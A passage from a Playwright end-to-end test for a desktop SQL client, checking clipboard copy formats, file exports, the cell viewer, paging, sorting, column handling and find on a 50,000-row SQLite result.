  await page.getByRole("tab", { name: /Consulta 1/ }).waitFor();
  await shot("03-espanol");
  await setLanguage("en");
  await panel.locator('.cm-search button[name="close"]').click();
  await panel.locator(".cm-content").click();
  await page.keyboard.press("Control+Alt+g");
  const gotoInput = panel.locator('.cm-goto-line input[name="line"]');
  await gotoInput.fill("3");
  await setLanguage("es");
  await panel.locator(".cm-goto-line label", { hasText: "Ir a la línea" }).waitFor();
  assert.equal(await gotoInput.inputValue(), "3");
  await setLanguage("en");
  await panel.locator(".cm-goto-line .cm-dialog-close").click();
  await shot("03-sqlite");

  step("copy: selection as TSV, with headers and as JSON (formatted by the core)");
  // Capture what goes to the clipboard instead of touching the system one.
  await page.evaluate(() => {
    window.__copied = [];
    navigator.clipboard.writeText = (text) => {
      window.__copied.push(text);
      return Promise.resolve();
    };
    // HTML copies go through write(): what is kept is the HTML.
    navigator.clipboard.write = async (items) => {
      window.__copied.push(await (await items[0].getType("text/html")).text());
    };
  });
  const copied = async (count) => {
    await page.waitForFunction((n) => window.__copied.length === n, count);
    return page.evaluate(() => window.__copied[window.__copied.length - 1]);
  };
  // The grid is a canvas: what it draws is read back as pixels (CSS coordinates).
  const pixel = (target, x, y) =>
    target.locator(".grid-canvas").evaluate((canvas, [x, y]) => {
      const dpr = window.devicePixelRatio || 1;
      const d = canvas.getContext("2d").getImageData(Math.round(x * dpr), Math.round(y * dpr), 1, 1).data;
      return `${d[0]},${d[1]},${d[2]}`;
    }, [x, y]);
  // Pixels of a rectangle that differ clearly from its top-left one (text, a checkbox…).
  const inked = (target, x0, y0, x1, y1) =>
    target.locator(".grid-canvas").evaluate((canvas, [x0, y0, x1, y1]) => {
      const dpr = window.devicePixelRatio || 1;
      const ctx = canvas.getContext("2d");
      const d = ctx.getImageData(Math.round(x0 * dpr), Math.round(y0 * dpr), Math.round((x1 - x0) * dpr), Math.round((y1 - y0) * dpr)).data;
      let count = 0;
      for (let i = 0; i < d.length; i += 4) {
        if (Math.abs(d[i] - d[0]) + Math.abs(d[i + 1] - d[1]) + Math.abs(d[i + 2] - d[2]) > 60) count++;
      }
      return count;
    }, [x0, y0, x1, y1]);
  // The longest time between two painted frames while `action` runs: the UI must not freeze.
  async function longestFrameGap(action) {
    await page.evaluate(() => {
      window.__gaps = [];
      window.__gapsOn = true;
      let last = performance.now();
      const tick = (now) => {
        window.__gaps.push(now - last);
        last = now;
        if (window.__gapsOn) requestAnimationFrame(tick);
      };
      requestAnimationFrame(tick);
    });
    const started = Date.now();
    await action();
    const elapsed = Date.now() - started;
    const gap = await page.evaluate(() => {
      window.__gapsOn = false;
      return Math.round(Math.max(0, ...window.__gaps));
    });
    return { elapsed, gap };
  }
  async function setGridLook(look) {
    await withSettings("appearance", async (settings) => {
      for (const [name, on] of Object.entries(look)) {
        const box = settings.locator(`input[name="${name}"]`);
        if ((await box.isChecked()) !== on) await box.click();
        await page.waitForFunction(([n, v]) => {
          const input = document.querySelector(`input[name="${n}"]`);
          return input?.checked === v && !input.matches(":disabled");
        }, [name, on]);
      }
    });
  }
  const grid = panel.locator(".grid-scroller");
  const gridBox = await grid.boundingBox();
  // First data cell: below the 34 px header, right of the row numbers.
  await page.mouse.click(gridBox.x + 80, gridBox.y + 34 + 12);
  await page.keyboard.press("Control+a");
  await page.keyboard.press("Control+c");
  const all = (await copied(1)).trimEnd().split("\n");
  assert.equal(all.length, 6);
  assert.equal(all[0].split("\t").length, 3);
  await page.mouse.click(gridBox.x + 80, gridBox.y + 34 + 12);
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Shift+ArrowRight");
  await page.keyboard.press("Control+Shift+c");
  const withHeaders = (await copied(2)).trimEnd().split("\n");
  assert.deepEqual(withHeaders[0].split("\t"), ["country", "orders"]);
  assert.equal(withHeaders.length, 4);
  await page.mouse.click(gridBox.x + 80, gridBox.y + 34 + 12, { button: "right" });
  await panel.getByRole("menuitem", { name: "Copy ▸" }).hover();
  await panel.getByRole("menuitem", { name: "Copy as JSON" }).waitFor();
  await shot("03b-copy-menu");
  await panel.getByRole("menuitem", { name: "Copy as JSON" }).click();
  const json = JSON.parse(await copied(3));
  assert.equal(json.length, 3);
  assert.equal(typeof json[0].orders, "number");
  assert.ok(json[0].country);
  await panel.getByRole("status").filter({ hasText: "Copied 3 rows × 2 columns" }).waitFor();
  await page.mouse.click(gridBox.x + 80, gridBox.y + 34 + 12);
  await page.mouse.click(gridBox.x + 80, gridBox.y + 34 + 12, { button: "right" });
  await panel.getByRole("menuitem", { name: "Copy ▸" }).hover();
  await panel.getByRole("menuitem", { name: "Copy as Markdown table" }).click();
  const markdown = (await copied(4)).trimEnd().split("\n");
  assert.equal(markdown[0], "| country |");
  assert.equal(markdown[1], "| --- |");
  assert.equal(markdown.length, 3);
  await panel.getByRole("status").filter({ hasText: "Copied 1 row × 1 column" }).waitFor();
  await page.mouse.click(gridBox.x + 80, gridBox.y + 34 + 12);
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Shift+ArrowDown");
  await page.mouse.click(gridBox.x + 80, gridBox.y + 34 + 12, { button: "right" });
  await panel.getByRole("menuitem", { name: "Copy ▸" }).hover();
  await panel.getByRole("menuitem", { name: "Copy as SQL IN list" }).click();
  assert.match(await copied(5), /^\('[^']+', '[^']+', '[^']+'\)$/);
  await page.mouse.click(gridBox.x + 80, gridBox.y + 34 + 12, { button: "right" });
  await panel.getByRole("menuitem", { name: "Copy ▸" }).hover();
  await panel.getByRole("menuitem", { name: "Copy as SQL INSERT" }).click();
  const tuples = json.map((row) => `('${row.country.replaceAll("'", "''")}')`).join(",\n  ");
  assert.equal(await copied(6), `INSERT INTO table_name (country) VALUES ${tuples};\n`);

  step("export: the loaded result, every row run again with CSV options, and a selection");
  // The native save dialog cannot be driven: src/dialogs.ts takes this path instead.
  const exportPath = (name) => join(userDir, name);
  const answerSaveDialog = (path) => page.evaluate((target) => (window.__spelaionSavePath = target), path);
  /** Opens the export dialog from `open`, picks the format, lets `setup` change the rest,
   *  exports to `path` and returns the dialog's last message. */
  const exportWith = async (open, title, format, path, setup) => {
    await answerSaveDialog(path);
    await open();
    const dialog = page.getByRole("dialog", { name: title });
    await dialog.waitFor();
    await dialog.getByRole("combobox", { name: /^Format/ }).selectOption(format);
    if (setup) await setup(dialog);
    await dialog.getByRole("button", { name: "Export…" }).click();
    const message = dialog.locator(".export-result");
    await message.waitFor();
    const text = await message.innerText();
    await shot(`03c-export-${format}`);
    await dialog.getByRole("button", { name: "Close" }).last().click();
    await dialog.waitFor({ state: "detached" });
    await page.evaluate(() => delete window.__spelaionSavePath);
    return text;
  };
  const openResultExport = () => panel.locator(".export-button").getByRole("button", { name: "Export…" }).click();
  assert.match(await exportWith(openResultExport, "Export result", "csv", exportPath("result.csv")), /^Exported 6 rows to /);
  const csv = readFileSync(exportPath("result.csv"), "utf8");
  assert.ok(csv.startsWith("\ufeffcountry,orders,total\r\n"), csv.slice(0, 40));
  assert.equal(csv.trimEnd().split("\r\n").length, 7);
  await exportWith(openResultExport, "Export result", "json", exportPath("result.json"));
  const exported = JSON.parse(readFileSync(exportPath("result.json"), "utf8"));
  assert.equal(exported.length, 6);
  assert.equal(typeof exported[0].total, "number");
  await exportWith(openResultExport, "Export result", "markdown", exportPath("result.md"));
  const md = readFileSync(exportPath("result.md"), "utf8").trimEnd().split("\n");
  assert.equal(md.length, 8);
  assert.equal(md[1], "| --- | ---: | ---: |");
  // Every row: the query runs again in a new session and streams to the file, with a
  // semicolon, plain UTF-8 and no header.
  const streamed = await exportWith(openResultExport, "Export result", "csv", exportPath("streamed.csv"), async (dialog) => {
    await dialog.getByRole("radio", { name: "Every row: run the query again" }).check();
    await dialog.getByText("It runs again in a new session").waitFor();
    await dialog.getByRole("combobox", { name: /^Delimiter/ }).selectOption(";");
    await dialog.getByRole("checkbox", { name: "Column names as the first row" }).uncheck();
    await dialog.getByRole("combobox", { name: /^Encoding/ }).selectOption("utf8");
  });
  assert.match(streamed, /^Exported 6 rows to /);
  const streamedLines = readFileSync(exportPath("streamed.csv"), "utf8").trimEnd().split("\r\n");
  assert.equal(streamedLines.length, 6);
  assert.deepEqual(streamedLines.map((line) => line.split(";").length), [3, 3, 3, 3, 3, 3]);
  assert.ok(!streamedLines[0].startsWith("\ufeff"));
  // A selection: its rows and its columns, from the grid's menu.
  {
    const grid = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.click(grid.x + 80, grid.y + 34 + 12);
    await page.keyboard.press("Shift+ArrowDown");
    await page.keyboard.press("Shift+ArrowRight");
    const openSelection = async () => {
      await page.mouse.click(grid.x + 80, grid.y + 34 + 12, { button: "right" });
      await panel.getByRole("menuitem", { name: "Export selection…" }).click();
    };
    const selected = await exportWith(openSelection, "Export selection", "tsv", exportPath("selection.tsv"));
    assert.match(selected, /^Exported 2 rows to /);
    const tsv = readFileSync(exportPath("selection.tsv"), "utf8").replace(/^\ufeff/, "").trimEnd().split("\n");
    assert.equal(tsv[0], "country\torders");
    assert.equal(tsv.length, 3);
  }

  step("cell viewer: pretty JSON, hex dump of bytes, full text");
  panel = await newQuery(
    "Shop (SQLite)",
    "select json_object('a', json_array(1, 2)) as doc, x'48656c6c6f00ff' as raw, 'line 1' || char(10) || 'line 2' as txt;",
  );
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  const viewerToggle = panel.getByRole("button", { name: "Cell value panel" });
  const closedToggleBox = await viewerToggle.boundingBox();
  const closedGridBox = await panel.locator(".grid-scroller").boundingBox();
  assert.ok(closedToggleBox.x >= closedGridBox.x + closedGridBox.width, "the viewer control is to the right of the grid");
  await viewerToggle.click();
  const viewer = panel.getByRole("complementary", { name: "Cell value" });
  await viewer.getByText("Select a cell to see its value.").waitFor();
  assert.ok((await viewerToggle.boundingBox()).x >= (await viewer.boundingBox()).x + (await viewer.boundingBox()).width, "the viewer control stays to the right of the open panel");
  assert.equal(await viewerToggle.getAttribute("aria-pressed"), "true");
  const viewerResize = panel.getByRole("separator", { name: "Resize cell value panel" });
  // The panel's width as the separator reports it, once the page shows that width.
  const viewerWidthNow = async () => {
    const handle = await page.waitForFunction(() => {
      const separator = document.querySelector('.tab-panel:not([hidden]) [role="separator"][aria-label="Resize cell value panel"]');
      const shown = separator && document.getElementById(separator.getAttribute("aria-controls"));
      const width = Number(separator?.getAttribute("aria-valuenow"));
      return shown && Math.abs(shown.getBoundingClientRect().width - width) < 1 ? width : false;
    });
    return handle.jsonValue();
  };
  // Waits for the panel's width to pass a check, and returns it (or the last one, to report it).
  const viewerWidthWhen = async (check) => {
    const deadline = Date.now() + 10_000;
    for (;;) {
      const width = await viewerWidthNow();
      if (check(width) || Date.now() > deadline) return width;
      await page.waitForTimeout(50);
    }
  };
  // Press on the separator only once the panel has opened and stopped moving.
  const beforeWidth = await viewerWidthNow();
  const resizeBox = await settledBox(viewerResize);
  await page.mouse.move(resizeBox.x + resizeBox.width / 2, resizeBox.y + resizeBox.height / 2);
  await page.mouse.down();
  await page.mouse.move(resizeBox.x - 80, resizeBox.y + resizeBox.height / 2, { steps: 5 });
  await page.mouse.up();
  const wider = await viewerWidthWhen((width) => width > beforeWidth + 50);
  assert.ok(wider > beforeWidth + 50, `drag should widen the viewer: ${beforeWidth} → ${wider}`);
  await viewerResize.focus();
  await page.keyboard.press("ArrowRight");
  const narrower = await viewerWidthWhen((width) => width < wider);
  assert.ok(narrower < wider, `keyboard should resize the viewer: ${wider} → ${narrower}`);
  await viewerToggle.click();
  await viewer.waitFor({ state: "detached" });
  assert.equal(await viewerToggle.getAttribute("aria-pressed"), "false");
  await viewerToggle.click();
  await viewer.getByText("Select a cell to see its value.").waitFor();
  const reopenedWidth = await viewerWidthWhen((width) => Math.abs(width - narrower) < 2);
  assert.ok(Math.abs(reopenedWidth - narrower) < 2, `the viewer keeps its width after toggling: ${narrower} → ${reopenedWidth}`);
  const viewerGrid = await panel.locator(".grid-scroller").boundingBox();
  await page.mouse.click(viewerGrid.x + 80, viewerGrid.y + 34 + 12);
  await viewer.locator(".cell-viewer-json").waitFor();
  assert.equal(await viewer.locator(".cell-viewer-value").innerText(), '{\n  "a": [\n    1,\n    2\n  ]\n}');
  await page.keyboard.press("ArrowRight");
  await viewer.locator(".cell-viewer-hex", { hasText: "48 65 6c 6c 6f 00 ff" }).waitFor();
  assert.match(await viewer.locator(".cell-viewer-value").innerText(), /^00000000 {2}48 65 6c 6c 6f 00 ff .* {2}Hello\.\.$/);
  await viewer.getByText("7 bytes").waitFor();
  await shot("03d-cell-viewer");
  await page.keyboard.press("ArrowRight");
  await viewer.locator(".cell-viewer-text").waitFor();
  assert.equal(await viewer.locator(".cell-viewer-value").innerText(), "line 1\nline 2");
  // The row view lists every column; picking one goes back to that cell.
  await viewer.getByRole("button", { name: "Row", exact: true }).click();
  await viewer.locator(".row-field").nth(2).waitFor();
  assert.deepEqual(await viewer.locator(".row-field dt").allInnerTexts(), ["doc TEXT", "raw BLOB", "txt TEXT"]);
  assert.equal(await viewer.locator(".row-field dd").nth(1).innerText(), "\\x48656c6c6f00ff");
  await shot("03e-row-view");
  await viewer.getByRole("button", { name: "Show the value of doc" }).focus();
  await page.keyboard.press("Enter");
  await viewer.locator(".cell-viewer-json").waitFor();
  await page.keyboard.press("Escape");
  await viewer.waitFor({ state: "detached" });

  step("grid menu and filter submenu stay visible near the window edges");
  await setHistorySaving("Shop (SQLite)", false);
  panel = await newQuery("Shop (SQLite)", "select id as a, id as b, id as c, id as d, id as e, id as f, id as g, id as h, id as i, id as j, id as k, id as l from orders limit 100;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "100 rows" }).waitFor();
  const edgeGrid = panel.locator(".grid-scroller");
  const edgeBox = await edgeGrid.boundingBox();
  await page.waitForTimeout(300);
  await page.mouse.click(edgeBox.x + edgeBox.width - 30, edgeBox.y + edgeBox.height - 30, { button: "right" });
  const edgeMenu = panel.locator(".result-grid-menu");
  await edgeMenu.waitFor();
  // "100 rows" shows before the statement has finished; "Export selection…" appears in the
  // menu once the result is complete. Every item is there before the menu is measured.
  await edgeMenu.getByRole("menuitem", { name: "Export selection…" }).waitFor();
  await settledBox(edgeMenu);
  const withinWindow = async (locator) => {
    const box = await locator.boundingBox();
    const viewport = await page.evaluate(() => ({ width: window.innerWidth, height: window.innerHeight }));
    assert.ok(box.x >= 0 && box.y >= 0 && box.x + box.width <= viewport.width && box.y + box.height <= viewport.height, JSON.stringify({ box, viewport }));
  };
  const hitTarget = async (locator) => locator.evaluate((element) => {
    const box = element.getBoundingClientRect();
    const hit = document.elementFromPoint(box.left + box.width / 2, box.top + box.height / 2);
    return hit !== null && element.contains(hit);
  });
  await withinWindow(edgeMenu);
  await edgeMenu.getByRole("menuitem", { name: "Copy ▸" }).hover();
  const edgeCopy = panel.getByRole("menu", { name: "Copy", exact: true });
  await edgeCopy.waitFor();
  await withinWindow(edgeCopy);
  assert.ok(await hitTarget(edgeCopy.getByRole("menuitem", { name: "Copy as SQL INSERT" })));
  const filterItem = edgeMenu.getByRole("menuitem", { name: "Filter ▸" });
  await filterItem.hover();
  const edgeSubmenu = panel.getByRole("menu", { name: "Filter", exact: true });
  await edgeSubmenu.waitFor();
  await withinWindow(edgeSubmenu);
  const customFilter = edgeSubmenu.getByRole("menuitem", { name: "Custom filter…" });
  assert.ok(await hitTarget(customFilter));
  // Into the submenu the way a person goes: sideways from "Filter ▸" into the submenu, which
  // sits beside it, then along the submenu to the item, never over the menu's other items.
  {
    const from = await filterItem.boundingBox();
    const sub = await settledBox(edgeSubmenu);
    const target = await settledBox(customFilter);
    const rowY = Math.min(Math.max(from.y + from.height / 2, sub.y + 4), sub.y + sub.height - 4);
    await page.mouse.move(target.x + target.width / 2, rowY, { steps: 8 });
    await page.mouse.move(target.x + target.width / 2, target.y + target.height / 2, { steps: 8 });
  }
  await customFilter.click();
  await page.getByRole("dialog", { name: "Custom filter" }).getByRole("button", { name: "Cancel" }).click();
  await page.keyboard.press("Control+w");
  await setHistorySaving("Shop (SQLite)", true);

  step("query pages: limit, count, scroll to fetch more, and navigate");
  await setHistorySaving("Shop (SQLite)", false);
  panel = await newQuery("Shop (SQLite)", "select * from orders order by id;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "500 rows" }).waitFor();
  const queryPages = panel.getByRole("group", { name: "Query result pages" });
  await queryPages.getByText("rows 1–500").waitFor();
  const accessibleGrid = panel.getByRole("grid");
  await accessibleGrid.focus();
  await accessibleGrid.getByRole("gridcell", { name: /Row 1, id \(INTEGER\): 1/ }).waitFor();
  await page.keyboard.press("ArrowRight");
  await accessibleGrid.getByRole("gridcell", { name: /Row 1, customer_id/ }).waitFor();
  await panel.getByText("Loaded rows only", { exact: true }).waitFor();
  assert.match(await panel.getByRole("searchbox", { name: "Filter rows" }).getAttribute("aria-describedby"), /.+/);
  const countButton = queryPages.getByRole("button", { name: "Count", exact: true });
  const nextButton = queryPages.getByRole("button", { name: "Next page" });
  const countBefore = await countButton.boundingBox();
  const nextBefore = await nextButton.boundingBox();
  // Reproduce the loading styles separately: the local count can finish before
  // Playwright can observe it, but its controls must occupy the same space.
  await countButton.evaluate((button) => {
    button.querySelector(".query-count-label").classList.add("busy");
    const spinner = document.createElement("span");
    spinner.className = "query-count-spinner";
    button.append(spinner);
  });
  const countDuring = await countButton.boundingBox();
  const nextDuring = await nextButton.boundingBox();
  assert.ok(Math.abs(countDuring.width - countBefore.width) < 1, "count button keeps its width while loading");
  assert.ok(Math.abs(nextDuring.x - nextBefore.x) < 1, "count loading does not move adjacent controls");
  await countButton.evaluate((button) => {
    button.querySelector(".query-count-label").classList.remove("busy");
    button.querySelector(".query-count-spinner").remove();
  });
  await countButton.click();
  await queryPages.getByText("rows 1–500 of 50,000").waitFor();
  await shot("04a-query-pages");
  const previousPageResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await queryPages.getByLabel("Rows per page").selectOption("100");
  await page.waitForFunction((el) => !el.isConnected, previousPageResult);
  await panel.locator(".statusline", { hasText: "100 rows" }).waitFor();
  await panel.locator(".grid-scroller").evaluate((el) => { el.scrollTop = el.scrollHeight; });
  await panel.locator(".statusline", { hasText: "200 rows" }).waitFor();
  await queryPages.getByRole("button", { name: "Next page" }).click();
  await queryPages.getByText("rows 101–200").waitFor();
  await page.waitForFunction((el) => !el.disabled, await queryPages.getByRole("button", { name: "Previous page" }).elementHandle());
  await queryPages.getByRole("button", { name: "Previous page" }).click();
  await queryPages.getByText("rows 1–100").waitFor();
  await page.keyboard.press("Control+w");
  await setHistorySaving("Shop (SQLite)", true);

  step("SQLite: an explicit LIMIT keeps the original 50,000-row result");
  panel = await newQuery("Shop (SQLite)", "select * from orders limit 50000;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "50,000 rows" }).waitFor();
  assert.equal(await panel.getByText("Loaded rows only", { exact: true }).count(), 0);
  await panel.locator(".grid-scroller").evaluate((el) => (el.scrollTop = 24 * 25_000));
  await page.waitForTimeout(500);
  await shot("04-grid-scroll");

  step("sort: header clicks sort the 50,000 rows in the core and undo it");
  const sortGrid = panel.locator(".grid-scroller");
  await sortGrid.evaluate((el) => {
    el.scrollTop = 0;
    el.scrollLeft = 0;
  });
  const sortBox = await sortGrid.boundingBox();
  // Row numbers take 60 px with 50,000 rows; read automatic widths from the real grid.
  const ROW_GUTTER_50K = 60;
  const ID_X = ROW_GUTTER_50K + 20;
  const initialWidths = (await sortGrid.getAttribute("data-column-widths")).split(",").map(Number);
  const TOTAL_X = ROW_GUTTER_50K + initialWidths.slice(0, 3).reduce((sum, width) => sum + width, 0) + 20;
  const sortedAs = (label) => panel.locator(`.grid-scroller[aria-label="Result with 50,000 rows${label}"]`).waitFor();
  const clickHeader = (x) => page.mouse.click(sortBox.x + x, sortBox.y + 18);
  const copyFirstRows = async (column, rows) => {
    const before = await page.evaluate(() => window.__copied.length);
    await sortGrid.evaluate((el) => {
      el.scrollTop = 0;
      el.scrollLeft = 0;
    });
    await page.mouse.click(sortBox.x + ID_X, sortBox.y + 34 + 12);
    for (let i = 0; i < column; i++) await page.keyboard.press("ArrowRight");
    for (let i = 1; i < rows; i++) await page.keyboard.press("Shift+ArrowDown");
    await page.keyboard.press("Control+c");
    return (await copied(before + 1)).trimEnd().split("\n");
  };
  await clickHeader(ID_X);
  await sortedAs(", sorted by id, ascending");
  await clickHeader(ID_X);
  await sortedAs(", sorted by id, descending");
  assert.deepEqual(await copyFirstRows(0, 2), ["50000", "49999"]);
  await clickHeader(TOTAL_X);
  await sortedAs(", sorted by total, ascending");
  await clickHeader(TOTAL_X);
  await sortedAs(", sorted by total, descending");
  const totals = (await copyFirstRows(3, 20)).map(Number);
  assert.equal(totals.length, 20);
  for (let i = 1; i < totals.length; i++) assert.ok(totals[i - 1] >= totals[i], `${totals[i - 1]} >= ${totals[i]}`);
  await shot("04b-grid-sorted");
  await clickHeader(TOTAL_X);
  await sortedAs("");
  assert.deepEqual(await copyFirstRows(0, 2), ["1", "2"]);

  step("columns: drag a header edge to resize, double-click it to fit the content");
  const widthsNow = async () => (await sortGrid.getAttribute("data-column-widths")).split(",").map(Number);
  const [idWidth, customerWidth, createdWidth] = await widthsNow();
  const createdEdge = sortBox.x + ROW_GUTTER_50K + idWidth + customerWidth + createdWidth;
  await page.mouse.move(createdEdge - 1, sortBox.y + 18);
  await page.mouse.down();
  await page.mouse.move(createdEdge + 60, sortBox.y + 18, { steps: 5 });
  await page.mouse.up();
  assert.equal((await widthsNow())[2], createdWidth + 61);
  await sortedAs("");
  // "created" holds 10-character dates: fitting makes it narrower than its initial width.
  await page.mouse.dblclick(sortBox.x + ROW_GUTTER_50K + idWidth + customerWidth + createdWidth + 61, sortBox.y + 18);
  for (let i = 0; i < 20 && (await widthsNow())[2] >= createdWidth; i++) await page.waitForTimeout(100);
  const fitted = (await widthsNow())[2];
  assert.ok(fitted < createdWidth && fitted > 60, `fitted width ${fitted}`);
  await sortedAs("");

  step("jump to column: Ctrl+Shift+J, type, Enter");
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 34 + 12);
  await page.keyboard.press("Control+Shift+J");
  const jump = panel.getByRole("dialog", { name: "Jump to column" });
  await jump.getByRole("textbox").fill("tot");
  assert.deepEqual(await jump.getByRole("option").allInnerTexts(), ["total"]);
  await page.keyboard.press("Enter");
  await jump.waitFor({ state: "detached" });
  {
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+Shift+c");
    assert.equal((await copied(before + 1)).split("\n")[0], "total");
  }

  step("grid: spreadsheet keys select cells, rows and columns, and the footer counts them");
  const selectionText = panel.locator(".grid-selection");
  const topLeftCell = () => page.mouse.click(sortBox.x + ID_X, sortBox.y + 34 + 12);
  await sortGrid.evaluate((el) => {
    el.scrollTop = 0;
    el.scrollLeft = 0;
  });
  await topLeftCell();
  await selectionText.getByText("1 cell selected", { exact: true }).waitFor();
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Shift+ArrowDown");
  await page.keyboard.press("Shift+ArrowRight");
  await selectionText.getByText("3 rows × 2 columns selected (6 cells)", { exact: true }).waitFor();
  await page.keyboard.press("Shift+Space");
  await selectionText.getByText("3 rows selected", { exact: true }).waitFor();
  await topLeftCell();
  await page.keyboard.press("Control+Space");
  await selectionText.getByText("1 column selected", { exact: true }).waitFor();
  // Ctrl+arrows go to the edge; Ctrl+Shift+arrows select up to it.
  await topLeftCell();
  await page.keyboard.press("Control+ArrowDown");
  {
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+c");
    // One cell copies as its value alone, with no line break after it (SDB-244).
    assert.equal(await copied(before + 1), "50000");
  }
  await page.keyboard.press("Control+Shift+ArrowUp");
  await selectionText.getByText("1 column selected", { exact: true }).waitFor();
  // From the last row: to the last column of that row.
  await page.keyboard.press("Control+Shift+End");
  await selectionText.getByText("1 row selected", { exact: true }).waitFor();
  await page.keyboard.press("Control+Home");
  await selectionText.getByText("1 cell selected", { exact: true }).waitFor();
  await page.keyboard.press("Shift+End");
  await selectionText.getByText("1 row selected", { exact: true }).waitFor();
  {
    // A row of several cells keeps its final line break, as spreadsheets paste rows.
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+c");
    const row = await copied(before + 1);
    assert.ok(row.includes("\t") && row.endsWith("\n") && row.indexOf("\n") === row.length - 1, JSON.stringify(row));
  }
  await page.keyboard.press("Control+a");
  await selectionText.getByText("All 50,000 rows selected", { exact: true }).waitFor();
  // Ctrl+click on a header selects the column instead of sorting.
  await page.keyboard.down("Control");
  await clickHeader(TOTAL_X);
  await page.keyboard.up("Control");
  await selectionText.getByText("1 column selected", { exact: true }).waitFor();
  await sortedAs("");
  await shot("04b2-grid-column-selected");

  step("grid: hide a column from its header, the footer shows it, the chooser brings it back");
  const CUSTOMER_X = ROW_GUTTER_50K + (await widthsNow())[0] + 20;
  await page.mouse.click(sortBox.x + CUSTOMER_X, sortBox.y + 18, { button: "right" });
  const headerMenu = panel.locator(".result-grid-menu");
  await headerMenu.getByRole("menuitem", { name: "Hide customer_id" }).click();
  await headerMenu.waitFor({ state: "detached" });
  assert.equal((await widthsNow())[1], 0, "customer_id has no width while hidden");
  const hiddenButton = panel.locator(".grid-footer .grid-hidden");
  await hiddenButton.getByText("1 hidden column", { exact: true }).waitFor();
  // Selections and copies skip it: id, then created.
  await topLeftCell();
  await page.keyboard.press("Shift+ArrowRight");
  await selectionText.getByText("1 row × 2 columns selected (2 cells)", { exact: true }).waitFor();
  {
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+Shift+c");
    const [header, row] = (await copied(before + 1)).trimEnd().split("\n");
    assert.equal(header, "id\tcreated");
    assert.match(row, /^1\t\d{4}-\d{2}-\d{2}/);
  }
  await shot("04b3-grid-hidden-column");
  await hiddenButton.click();
  const chooser = panel.getByRole("dialog", { name: "Columns" });
  await chooser.getByRole("searchbox").fill("cust");
  await chooser.getByRole("checkbox", { name: "customer_id" }).check();
  await hiddenButton.waitFor({ state: "detached" });
  assert.ok((await widthsNow())[1] > 0, "customer_id is shown again");
  await page.keyboard.press("Escape");
  await chooser.waitFor({ state: "detached" });

  step("grid: freeze the first column, it stays while the others scroll");
  // "total" made wide enough for the grid to scroll sideways.
  const totalEdge = sortBox.x + ROW_GUTTER_50K + (await widthsNow()).reduce((a, b) => a + b, 0);
  await page.mouse.move(totalEdge - 1, sortBox.y + 18);
  await page.mouse.down();
  await page.mouse.move(totalEdge + 1200, sortBox.y + 18, { steps: 5 });
  await page.mouse.up();
  await sortedAs("");
  assert.ok((await sortGrid.evaluate((el) => el.scrollWidth - el.clientWidth)) > 400, "the grid scrolls sideways");
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 18, { button: "right" });
  await headerMenu.getByRole("menuitemcheckbox", { name: "Freeze first column" }).click();
  await sortGrid.evaluate((el) => (el.scrollLeft = 400));
  await page.waitForTimeout(100);
  assert.equal(await sortGrid.evaluate((el) => el.scrollLeft), 400);
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 34 + 12);
  {
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+c");
    assert.equal(await copied(before + 1), "1", "the frozen id column is still under the pointer");
  }
  await shot("04b4-grid-frozen");
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 18, { button: "right" });
  const unfreeze = headerMenu.getByRole("menuitemcheckbox", { name: "Freeze first column" });
  assert.equal(await unfreeze.getAttribute("aria-checked"), "true");
  await unfreeze.click();
  // Unfrozen, the same place shows a column that scrolled in.
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 34 + 12);
  {
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+c");
    assert.notEqual((await copied(before + 1)).trimEnd(), "1", "id scrolled away");
  }
  // Fit "total" back to its content, from its edge at the far right.
  const farLeft = await sortGrid.evaluate((el) => (el.scrollLeft = el.scrollWidth - el.clientWidth));
  await page.waitForTimeout(100);
  await page.mouse.dblclick(sortBox.x + ROW_GUTTER_50K + (await widthsNow()).reduce((a, b) => a + b, 0) - farLeft - 1, sortBox.y + 18);
  for (let i = 0; i < 20 && (await widthsNow())[3] > 400; i++) await page.waitForTimeout(100);
  assert.ok((await widthsNow())[3] < 400, "total fitted back");
  await sortGrid.evaluate((el) => (el.scrollLeft = 0));
  await sortedAs("");

  step("grid look: zebra rows switched off in Settings repaint the grid");
  const createdRight = ROW_GUTTER_50K + (await widthsNow()).slice(0, 3).reduce((a, b) => a + b, 0) - 4;
  const rowY = (row) => 34 + row * 24 + 12;
  assert.notEqual(await pixel(panel, createdRight, rowY(3)), await pixel(panel, createdRight, rowY(4)), "odd rows are tinted");
  await setGridLook({ zebra: false });
  assert.equal(await pixel(panel, createdRight, rowY(3)), await pixel(panel, createdRight, rowY(4)), "no tint without zebra rows");
  await setGridLook({ zebra: true });

  step("find: Ctrl+F searches the 50,000 rows in the core, Enter and F3 step through the matches");
  await sortGrid.evaluate((el) => {
    el.scrollTop = 0;
    el.scrollLeft = 0;
  });
  await topLeftCell();
  await page.keyboard.press("Control+f");
  const findBar = panel.getByRole("search", { name: "Find in results" });
  const findStatus = findBar.getByRole("status");
  // 4999, 14999, 24999, 34999, 44999 and 49990–49999: only ids hold it.
  await findBar.getByRole("searchbox").fill("4999");
  await findStatus.getByText("1 of 15", { exact: true }).waitFor();
  await page.keyboard.press("Enter");
  await findStatus.getByText("2 of 15", { exact: true }).waitFor();
  await sortGrid.focus();
  {
    // The active cell follows the match.
    const before = await page.evaluate(() => window.__copied.length);
    await page.keyboard.press("Control+c");
    assert.equal(await copied(before + 1), "14999");
  }
  await page.keyboard.press("F3");
